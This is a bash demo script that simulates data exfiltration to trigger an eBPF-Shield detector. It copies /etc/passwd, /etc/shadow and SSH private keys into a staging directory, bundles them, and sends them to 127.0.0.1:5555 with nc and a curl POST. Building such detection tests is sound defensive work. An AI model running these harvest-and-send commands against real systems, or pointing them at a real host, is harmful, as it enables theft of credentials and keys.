#!/bin/bash
# ============================================================================
# attack_file_exfil.sh — Simulate data exfiltration for eBPF-Shield demo
# ============================================================================
#
# ⚠️  DEMO ONLY — This script simulates the syscall pattern of data
# exfiltration: rapid reads of sensitive files followed by network
# transmission attempts.
#
# Expected eBPF-Shield detections:
#   • sensitive_file_access  — reading /etc/passwd, /etc/shadow, SSH keys
#   • connect_count          — outbound network connections
#   • high syscall_rate      — rapid file I/O burst
#
# Usage:
#   chmod +x attack_file_exfil.sh
#   ./attack_file_exfil.sh
#
# ============================================================================

set -uo pipefail

# Colors
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
DIM='\033[2m'
BOLD='\033[1m'
RESET='\033[0m'

STAGING_DIR=$(mktemp -d /tmp/exfil_staging_XXXXXX 2>/dev/null || echo "/tmp/exfil_staging_$$")
EXFIL_HOST="127.0.0.1"
EXFIL_PORT="5555"

echo -e "${RED}╔══════════════════════════════════════════════════════╗${RESET}"
echo -e "${RED}║  ⚠  eBPF-Shield — Data Exfiltration Simulation      ║${RESET}"
echo -e "${RED}║     FOR DEMO / TESTING PURPOSES ONLY                ║${RESET}"
echo -e "${RED}╚══════════════════════════════════════════════════════╝${RESET}"
echo ""
sleep 1

# ── Stage 1: Harvest sensitive files ─────────────────────────────────────

echo -e "${YELLOW}[STAGE 1]${RESET} ${BOLD}Harvesting Sensitive Files${RESET}"
echo -e "${DIM}  Triggers: sensitive_file_access, high syscall_rate${RESET}"
sleep 0.5

mkdir -p "$STAGING_DIR" 2>/dev/null || true

# Read /etc/passwd
echo -e "${DIM}  Reading /etc/passwd...${RESET}"
cp /etc/passwd "$STAGING_DIR/passwd" 2>/dev/null && \
    echo -e "${RED}  ✗ Harvested /etc/passwd${RESET}" || \
    echo -e "${DIM}  → Could not read /etc/passwd${RESET}"

# Read /etc/shadow (requires root)
echo -e "${DIM}  Reading /etc/shadow...${RESET}"
cp /etc/shadow "$STAGING_DIR/shadow" 2>/dev/null && \
    echo -e "${RED}  ✗ Harvested /etc/shadow${RESET}" || \
    echo -e "${DIM}  → Permission denied for /etc/shadow (expected)${RESET}"

# Read SSH keys
echo -e "${DIM}  Searching for SSH keys...${RESET}"
for keyfile in ~/.ssh/id_rsa ~/.ssh/id_ed25519 /root/.ssh/id_rsa; do
    if [ -f "$keyfile" ] 2>/dev/null; then
        cp "$keyfile" "$STAGING_DIR/" 2>/dev/null && \
            echo -e "${RED}  ✗ Harvested $keyfile${RESET}" || true
    else
        echo -e "${DIM}  → $keyfile not found${RESET}"
    fi
done

# Read other sensitive files
echo -e "${DIM}  Reading additional targets...${RESET}"
cat /etc/hosts > /dev/null 2>&1 || true
cat /etc/resolv.conf > /dev/null 2>&1 || true
cat /etc/crontab > /dev/null 2>&1 || true
cat /etc/group > /dev/null 2>&1 || true
cat /proc/version > /dev/null 2>&1 || true

echo -e "${YELLOW}  → Stage 1 complete: sensitive files harvested${RESET}"
echo ""
sleep 1

# ── Stage 2: Rapid file I/O burst ────────────────────────────────────────

echo -e "${YELLOW}[STAGE 2]${RESET} ${BOLD}Rapid File I/O Burst${RESET}"
echo -e "${DIM}  Triggers: high syscall_rate (rapid open/read/close pattern)${RESET}"
sleep 0.5

echo -e "${DIM}  Executing rapid file reads (50 iterations)...${RESET}"
for i in $(seq 1 50); do
    cat /etc/passwd > /dev/null 2>&1
    cat /etc/hosts > /dev/null 2>&1
    cat /etc/resolv.conf > /dev/null 2>&1
done
echo -e "${RED}  ✗ 150 rapid file reads completed${RESET}"

echo -e "${DIM}  Compressing staged data...${RESET}"
if command -v tar &> /dev/null; then
    tar czf "$STAGING_DIR/exfil_bundle.tar.gz" -C "$STAGING_DIR" . 2>/dev/null || true
    echo -e "${RED}  ✗ Data bundle created: exfil_bundle.tar.gz${RESET}"
fi

echo -e "${YELLOW}  → Stage 2 complete: data prepared for exfiltration${RESET}"
echo ""
sleep 1

# ── Stage 3: Network exfiltration attempt ────────────────────────────────

echo -e "${YELLOW}[STAGE 3]${RESET} ${BOLD}Network Exfiltration${RESET}"
echo -e "${DIM}  Triggers: connect_count (outbound connections)${RESET}"
sleep 0.5

echo -e "${DIM}  Attempting exfiltration to ${EXFIL_HOST}:${EXFIL_PORT}...${RESET}"

# Attempt via netcat
if command -v nc &> /dev/null; then
    echo -e "${DIM}  Using netcat (nc)...${RESET}"
    echo "EXFIL_DATA_$(date +%s)" | nc -w 2 "$EXFIL_HOST" "$EXFIL_PORT" 2>/dev/null && \
        echo -e "${RED}  ✗ Data sent via netcat${RESET}" || \
        echo -e "${DIM}  → Connection refused (expected — no listener)${RESET}"

    # Send staged files
    if [ -f "$STAGING_DIR/exfil_bundle.tar.gz" ]; then
        nc -w 2 "$EXFIL_HOST" "$EXFIL_PORT" < "$STAGING_DIR/exfil_bundle.tar.gz" 2>/dev/null || true
    fi
elif command -v ncat &> /dev/null; then
    echo -e "${DIM}  Using ncat...${RESET}"
    echo "EXFIL_DATA_$(date +%s)" | ncat -w 2 "$EXFIL_HOST" "$EXFIL_PORT" 2>/dev/null || \
        echo -e "${DIM}  → Connection refused (expected)${RESET}"
else
    echo -e "${DIM}  Neither nc nor ncat available${RESET}"
fi

# Also try curl-based exfil (generates connect syscalls)
if command -v curl &> /dev/null; then
    echo -e "${DIM}  Attempting HTTP exfiltration...${RESET}"
    curl -s -m 2 -X POST "http://${EXFIL_HOST}:${EXFIL_PORT}/exfil" \
        -d @/etc/passwd 2>/dev/null || \
        echo -e "${DIM}  → HTTP exfil failed (expected)${RESET}"
fi

# Multiple rapid connection attempts (triggers connect_count)
echo -e "${DIM}  Rapid connection burst (10 attempts)...${RESET}"
for port in 5555 5556 5557 5558 5559 6666 7777 8888 9999 4444; do
    (echo "probe" | nc -w 1 "$EXFIL_HOST" "$port" 2>/dev/null || true) &
done
wait 2>/dev/null

echo -e "${YELLOW}  → Stage 3 complete: network exfiltration attempted${RESET}"
echo ""
sleep 1

# ── Cleanup ──────────────────────────────────────────────────────────────

echo -e "${DIM}  Cleaning up staging directory...${RESET}"
rm -rf "$STAGING_DIR" 2>/dev/null || true

# ── Summary ──────────────────────────────────────────────────────────────

echo -e "${RED}╔══════════════════════════════════════════════════════╗${RESET}"
echo -e "${RED}║  Data exfiltration simulation complete!              ║${RESET}"
echo -e "${RED}║                                                     ║${RESET}"
echo -e "${RED}║  Expected eBPF-Shield detections:                   ║${RESET}"
echo -e "${RED}║    • sensitive_file_access  (Stage 1)               ║${RESET}"
echo -e "${RED}║    • high syscall_rate      (Stage 2)               ║${RESET}"
echo -e "${RED}║    • connect_count          (Stage 3)               ║${RESET}"
echo -e "${RED}╚══════════════════════════════════════════════════════╝${RESET}"
